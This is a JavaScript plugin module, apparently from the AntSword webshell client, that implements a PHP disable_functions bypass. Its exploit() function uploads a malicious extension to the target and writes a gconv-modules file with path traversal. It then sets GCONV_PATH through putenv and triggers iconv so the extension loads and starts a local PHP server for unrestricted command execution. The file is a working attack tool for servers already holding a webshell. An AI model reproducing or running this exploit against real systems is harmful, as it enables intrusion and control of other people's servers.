'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示

let ICONV_LANG = LANG['core']['iconv'];

class ICONV extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if (this.precheck() == false) {
      return;
    }
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    if (infodata.os.toLowerCase() !== "linux") {
      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
      return false;
    }
    return true;
  }

  createForm(cell) {
    let self = this;
    let form = cell.attachForm([{
        type: 'settings',
        position: 'label-left',
        labelWidth: 100,
        inputWidth: 300,
      }, {
        type: 'block',
        inputWidth: 'auto',
        list: [{
            type: 'label',
            label: ICONV_LANG['title']
          },
          {
            type: 'block',
            inputWidth: 'auto',
            list: [{
                type: 'settings'
              },
              {
                type: "label",
                label: `<span>putenv</span>`,
              },
              {
                type: "label",
                label: `<span>iconv (option)</span>`,
              },
              {
                type: "newcolumn"
              },
              {
                type: "label",
                label: `<span style='color: ${self.top.infodata.funcs['putenv']?"green":"red"};'>${antSword.noxss(self.top.infodata.funcs['putenv']?'YES':'NO')}</span>`,
              }, {
                type: "label",
                label: `<span style='color: ${self.top.infodata.funcs['iconv']?"green":"red"};'>${antSword.noxss(self.top.infodata.funcs['iconv']?'YES':'NO')}</span>`,
              },
            ],
          },
          {
            type: 'combo',
            label: ICONV_LANG['form']['phpbinary'],
            labelWidth: 300,
            name: 'phpbinary',
            required: true,
            options: (() => {
              let vals = [
                'php',
                'php.exe',
                '/usr/bin/php',
                'C:/php/php.exe'
              ];
              let ret = [];
              vals.map((_) => {
                ret.push({
                  text: _,
                  value: _
                });
              });
              return ret;
            })()
          }
        ]
      },
      {
        type: 'block',
        labelWidth: 100,
        inputWidth: 'auto',
        className: "display: flex;flex-direction: row;align-items: center;",
        list: [{
          type: 'label',
          label: '',
          name: 'status_label'
        }, {
          type: 'newcolumn',
          offset: 20
        }, {
          type: 'label',
          label: '',
          name: 'status_msg'
        }, ]
      },
      {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'template',
          label: "Reference",
          style: "width:100%;",
          format: references
        }, ]
      }
    ], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
    if (self.form.validate()) {
      self.cell.progressOn();
      let core = self.top.core;
      let formvals = self.form.getValues();
      let phpbinary = formvals['phpbinary'];
      // 生成 ext
      let wdir = "";
      if (self.isOpenBasedir) {
        for (var v in self.top.infodata.open_basedir) {
          if (self.top.infodata.open_basedir[v] == 1) {
            if (v == self.top.infodata.phpself) {
              wdir = v;
            } else {
              wdir = v;
            }
            break;
          }
        };
      } else {
        wdir = self.top.infodata.temp_dir;
      }
      let cmd = `${phpbinary} -n -S 127.0.0.1:${port} -t ${self.top.infodata.phpself}`;
      let fileBuffer = self.generateExt(cmd);
      if (!fileBuffer) {
        toastr.warning(ICONV_LANG['msg']['genext_err'], LANG_T["warning"]);
        self.cell.progressOff();
        return
      }

      new Promise((res, rej) => {
        var ext_path = `${wdir}/.${String(Math.random()).substr(2, 5)}${self.ext_name}`;
        // 上传 ext
        core.request(
          core.filemanager.upload_file({
            path: ext_path,
            content: fileBuffer
          })
        ).then((response) => {
          var ret = response['text'];
          if (ret === '1') {
            toastr.success(`Upload extension ${ext_path} success.`, LANG_T['success']);
            res(ext_path);
          } else {
            rej("upload extension fail");
          }
        }).catch((err) => {
          rej(err)
        });
      }).then((p) => {
        // 触发 payload, 会超时
        var payloaddir = path.dirname(p);
        var gconvmodules_payload = `module  PAYLOAD//    INTERNAL    ../../../../../../../../../../../../../../../../../../../../../../../../../..${p.substring(0,p.length-3)}    2
module  INTERNAL    PAYLOAD//    ../../../../../../../../../../../../../../../../../../../../../../../../../..${p.substring(0,p.length-3)}    2
`;
        var gconvmodules = Buffer.from(gconvmodules_payload).toString('base64');
        var payload = `file_put_contents("${payloaddir}/gconv-modules",base64_decode("${gconvmodules}"));
putenv("GCONV_PATH=${payloaddir}");
if(function_exists('iconv')){
  iconv("payload","UTF-8","whatever");
}else if(function_exists('iconv_strlen')){
  iconv_strlen("1","payload");
}else if(function_exists('file_get_contents')){
  @file_get_contents("php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==");
}else{
  @fopen('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==','r');
};
echo(1);`;
        core.request({
          _: payload,
        }).then((response) => {

        }).catch((err) => {
          // 超时也是正常
        })
      }).then(() => {
        // 验证是否成功开启
        var payload = `sleep(1);
          $fp = @fsockopen("127.0.0.1", ${port}, $errno, $errstr, 1);
          if(!$fp){
            echo(0);
          }else{
            echo(1);
            @fclose($fp);
          };`
        core.request({
          _: payload,
        }).then((response) => {
          var ret = response['text'];
          if (ret === '1') {
            toastr.success(LANG['success'], LANG_T['success']);
            self.form.setItemLabel('status_msg', `127.0.0.1:${port}`);
            self.uploadProxyScript("127.0.0.1", port);
            self.cell.progressOff();
          } else {
            self.cell.progressOff();
            throw ("exploit fail");
          }
        }).catch((err) => {
          self.cell.progressOff();
          toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
        });
      }).catch((err) => {
        self.cell.progressOff();
        toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
      });
    } else {
      toastr.warning(LANG['form_not_comp'], LANG_T["warning"]);
    }
    return;
  }
}

function references(name, value) {
  let refs = {
    "github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/": "https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/",
    "https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80": "https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80",
  };
  let ret = "";
  Object.keys(refs).map((k) => {
    ret += `<li style="padding-bottom: 10px;"><a href='${refs[k]}' target='_blank'>${k}</a></li>`;
  })
  return `<div class='simple_link'><ul>${ret}</ul></div>`;
}
module.exports = ICONV;